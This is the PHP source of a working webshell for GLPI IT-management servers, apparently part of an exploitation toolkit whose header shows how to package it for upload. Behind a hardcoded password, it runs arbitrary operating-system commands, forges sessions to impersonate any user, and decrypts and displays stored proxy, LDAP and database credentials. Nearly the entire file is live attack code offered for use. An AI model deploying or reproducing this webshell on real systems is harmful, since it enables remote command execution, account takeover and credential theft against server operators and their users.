<?php

/****************************************************************
 * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
 *
 * ```bash
 * python3 -c 'import zlib;import base64; shell = open("shell.php", "rb");print(base64.b64encode(zlib.compress(shell.read())));shell.close()'
 * ```
 ****************************************************************/

error_reporting(E_ERROR | E_PARSE);

$password = "P@ssw0rd123";

function center($elt){
    return '<div style="text-align:center;margin-top: 10px;">' . $elt . '</div>';
}

function title($m){
  echo '<div style="background:#f8f8f8; padding:12px 15px; border-bottom:1px solid #eee;">
            <h2 style="margin:0; font-size:18px; color:#2c3e50;">
                ' . htmlentities(ucfirst($m)) . '
            </h2>
        </div>';
}

function decrypt_pass($pass){
  if(method_exists("GLPIKey", "decrypt")){
    return (new GLPIKey())->decrypt($pass);
  } elseif(method_exists("Toolbox", "decrypt")){
    if(method_exists("Toolbox", "sodiumDecrypt")){
      return Toolbox::sodiumDecrypt($pass);
    }
    ### Really old glpi decrypted with a key in the config
    return Toolbox::decrypt($pass, GLPIKEY);
  } else {
    return "<ENCRYPTED>[{$pass}]";
  }
}

function dump_password(){
  global $CFG_GLPI, $DB;

  ### Show password informations
  # Dump Proxy scheme
  # Dump LDAP Password
  title("IV. Passwords");
  if(!empty($CFG_GLPI["proxy_name"]))
  {
    $proxy_credz = !empty($CFG_GLPI["proxy_user"])?$CFG_GLPI["proxy_user"] . ":" . decrypt_pass($CFG_GLPI["proxy_passwd"]) . "@":"";
    $proxy_url = "http://{$proxy_credz}" . $CFG_GLPI['proxy_name'] . ":" . $CFG_GLPI['proxy_port'];
    echo "<h2> Proxy Connection:</h2>";
    Html::printCleanArray(array("Proxy In Use" => $proxy_url));
  }

  $config_ldap = new AuthLDAP();
  $all_connections = $config_ldap->find();

  foreach($all_connections as $connection){
    if(isset($connection['rootdn_passwd']) && isset($connection['rootdn'])){
      $ldap_pass = decrypt_pass($connection['rootdn_passwd']);
      echo "<h2> Ldap Connection:</h2>";
      Html::printCleanArray(array("LDAP Base" => $connection['rootdn'], "LDAP DN" => $connection["basedn"], "LDAP Password" => $ldap_pass, "Connection is active" => $connection['is_active']));
      }
    }

  # Dump DB password
  if(!is_null($DB)){
    echo "<h2> Database informations:</h2>";
    Html::printCleanArray(array("DB Host" => $DB->dbhost,
                                "DB Database" => $DB->dbdefault,
                                "DB User" => $DB->dbuser,
                                "DB Password" => urldecode($DB->dbpassword)));
  }
}

function fakelogin(){
    /**
     * Fake login and return a boll if it works or not
     */
    try{
        global $DB;
        if(isset($_SESSION['valid_id'])
           && $_SESSION['valid_id'] === session_id()
           && isset($_SESSION["glpiname"])){
            return true;
        }

        if(version_compare(GLPI_VERSION, '10.0.0', '<')){
            $iterator = $DB->request(User::getTable(), [
                'FIELDS' => ['id'],
                "WHERE"  => [
                    "is_active"  => 1,
                    "is_deleted" => 0,
                ],
                "LIMIT" => 1
            ]);
        } else {
            $iterator = $DB->request([
                "SELECT" => ["id"],
                "FROM"   => User::getTable(),
                "WHERE"  => [
                    "is_active"  => 1,
                    "is_deleted" => 0,
                ],
                "LIMIT" => 1
            ]);
        }

        if (count($iterator) == 0) {
            return false;
        }

        foreach($iterator as $row){
            $user_id = $row["id"];
            break;
        }

        $user = new User();
        if (!$user->getFromDB($user_id)) {
            return false;
        }

        // Start fake session
        $auth = new Auth();
        $auth->auth_succeded = true;
        $auth->user = $user;
        Session::init($auth);
        set_authenticated();
        return true;
    } catch(Exception $e) {
        echo $e->getMessage();
        return false;
    }
}

function display_users(){
    global $DB;
    $users = [];
    if(version_compare(GLPI_VERSION, '10.0.0', '<')){
        $query = "
            SELECT
               " . User::getTable() . ".id,
               " . User::getTable() . ".name,
               " . Profile::getTable() . ".name AS profile_name
            FROM " . User::getTable() . "

            LEFT JOIN " . Profile_User::getTable() . "
               ON " . Profile_User::getTable() . ".users_id = " . User::getTable() . ".id

            LEFT JOIN " . Profile::getTable() . "
               ON " . Profile::getTable() . ".id = " . Profile_User::getTable() . ".profiles_id

            WHERE " . User::getTable() . ".is_active = 1
              AND " . User::getTable() . ".is_deleted = 0
              AND " . Profile::getTable() . ".id <> 0

            LIMIT 100
            ";
        $iterator = $DB->query($query);
    } else {
        $iterator = $DB->request([
            'SELECT' => [
                User::getTable()        => ['id', 'name'],
                Profile::getTable()     => ['name AS profile_name'],
            ],
            'FROM' => User::getTable(),
            'LEFT JOIN' => [
                Profile_User::getTable() => [
                    'ON' => [
                        User::getTable()        => 'id',
                        Profile_User::getTable() => 'users_id',
                    ],
                ],
                Profile::getTable() => [
                    'ON' => [
                        Profile_User::getTable() => 'profiles_id',
                        Profile::getTable()      => 'id',
                    ],
                ],
            ],
            'WHERE' => [
                User::getTable() . '.is_active'  => 1,
                User::getTable() . '.is_deleted' => 0,
                "NOT" => [
                    Profile::getTable().'.id' => 0
                ]
            ],
            'LIMIT' => 100
        ]);
    }
    if(count($iterator)){
        title("II. Impersonate a user");
        foreach ($iterator as $row) {
            $users[$row["id"]] = $row['name'] . " - " . $row["profile_name"];
        }
        echo '<form method="GET" class="form-control">';
        Dropdown::showFromArray('user_id',
                                $users,
                                [
                                    'id'                  => 'impersonate',
                                    'width'               => '100%',
                                ]);
        echo center(Html::submit('Impersonate user',
                    [
                        'name'  => 'submit',
                        'class' => 'btn btn-primary',
                    ]));
        echo '</form>';
    }
}

function impersonateUser($uid = null){
    /**
     * Login as a different user
     */
    if(!is_null($uid)) {
        $user = new User();
        if ($user->getFromDB($uid)) {
            $auth = new Auth();
            $auth->auth_succeded = true;
            $auth->user = $user;
            Session::init($auth);
            set_authenticated();
        }
    }
}

function form_cmd(){
    title("I. Run system command (exec)");
    echo '<form class="form-control" method="GET">';
    echo '<input class="form-control" type="text" name="p_run" placeholder="cmd" width="100%" autofocus>';
    echo center(Html::submit('Run command',
                    [
                        'name'  => 'submit',
                        'class' => 'btn btn-primary',
                    ]));
    echo '</form>';
}

function run_cmd($cmd){
    if(!empty($cmd))
    {
        $output=null;
        $retval=null;
        exec($cmd, $output, $retval);
        foreach ($output as $line) {
            echo htmlentities($line) . "</br>";
        }
    }
}

function set_authenticated(){
    if(!isset($_SESSION['webshell_glpi'])){
        $_SESSION['webshell_glpi'] = "ok";
    }
}

/**
 * This webshell handle three cases:
 *  - Direct access on versions < 11
 *  - Loaded from symfony LegacyController
 *  - Direct access on versions >= 11
 */
if (!isset($GLOBALS['kernel'])) {
    // Kernel does not exists (we are not in symfony)
    // Is this a version that uses symfony and thus deprecate the use of $SECURITY_STRATEGY
    $SECURITY_STRATEGY = "no_check";
    for ($i=0; $i < 4; $i++) {
        $relative = str_repeat("../", $i);

        $to_include = "{$relative}inc/includes.php";
        $vendor = "{$relative}vendor/autoload.php";
        if(file_exists($to_include)){
            if(strpos(file_get_contents($to_include), "variable has no effect") === false)
            {   // Version that support SECURITY_STRATEGY
                include_once($to_include);
            } else {
                // Symfony direct access, we need to unset SECURITY_STRATEGY and boot the kernel
                unset($SECURITY_STRATEGY);
                if(is_file($vendor)){
                    include_once($vendor);
                    $kernel = new Glpi\Kernel\Kernel();
                    $kernel->boot();
                }
            }
            break;
        }
    }
} // else --> Included from legacy controller, nothing to do

// Check if we successfully included GLPI
if(isset($GLOBALS["DB"])){
    Session::start();
    if(!isset($_SESSION["glpiactiveprofile"])){
        // For glpi old versions
        $_SESSION["glpiactiveprofile"]["interface"] = "";
    }
    if((isset($_GET["passwd"]) && $_GET["passwd"] === $password) || isset($_SESSION['webshell_glpi']))
    {
        try{
            // Set session as authenticated
            set_authenticated();

            // Wanna logged in as another user
            if(fakelogin()){
                $impersonate_id = isset($_GET["user_id"]) ? $_GET["user_id"] : null;
                impersonateUser($impersonate_id);
            }

            // Present header
            Html::nullHeader("GLPI Webshell");
            if(isset($_SESSION['glpiname'])){
                echo "<h1>Current user: " . $_SESSION['glpiname'] . "</h1>";
            } else {
                echo "<h1>Currently unauthenticated</h1>";
            }
            echo "<hr>";

            // Display command
            echo '<div style="display:flex; gap:20px; width:100%; align-items:flex-start;">';
            echo '<div style="width: 60%; background:#fff; border:1px solid #eee; border-radius:6px; box-shadow:0 1px 3px rgba(0,0,0,.1); overflow:hidden;">';
            form_cmd();
            echo '</div>';

            // Display users
            echo '<div style="width: 40%; background:#fff; border:1px solid #eee; border-radius:6px; box-shadow:0 1px 3px rgba(0,0,0,.1); overflow:hidden;">';
            display_users();
            echo '</div>';
            echo '</div>';

            // Run cmd if any
            echo '<div style="margin-top:20px;background:#fff; border:1px solid #ddd; border-radius:6px; box-shadow:0 1px 3px rgba(0,0,0,.08); overflow:hidden;">';
            title("III. Command output");
            echo '<div style="padding:15px;">
                  <pre style="margin:0; padding:15px; background:#f5f5f5; color:#333; border:1px solid #ddd; border-radius:4px;
                    font-family:\'Courier New\', monospace; font-size:13px; line-height:1.2; max-height:400px; overflow:auto; white-space:pre-wrap;">';
            if(isset($_GET["p_run"])){
                run_cmd($_GET["p_run"]);
            }
            echo "</div></div></pre>";

            // Display passwords
            echo '<div style="margin:0 auto;margin-top:20px; background:#fff; border:1px solid #eee; border-radius:6px; box-shadow:0 1px 3px rgba(0,0,0,.08); overflow:hidden; max-width: 70%;">';
            dump_password();
            echo '</div></div>';

            // Finally display footer
            Html::footer();
        } catch(Exception $e) {
            echo $e->getMessage();
        }
    } else {
        Html::nullHeader("GLPI Webshell");
        echo "<h1>Not connected</h1>";
    }
}
